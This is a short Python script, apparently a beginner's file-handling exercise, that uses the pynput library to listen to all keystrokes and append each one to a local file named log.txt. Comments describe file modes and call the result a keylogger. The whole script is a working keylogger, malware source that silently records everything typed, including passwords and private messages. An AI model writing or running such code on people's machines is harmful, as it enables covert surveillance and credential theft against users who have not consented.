# storing the keyloggers in a text file
#file Handling - How to read, write and append to a file

from pynput.keyboard import Listener

'''f = open("log.txt", 'a') 
f.write("\ni am Good")
f.close()'''

#r - reading
# w - writing
# a - appending to a file

#listeners = listen to keystrrokes
def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:
        f.write(letter)
    

with Listener(on_press=write_to_file) as l:
    l.join()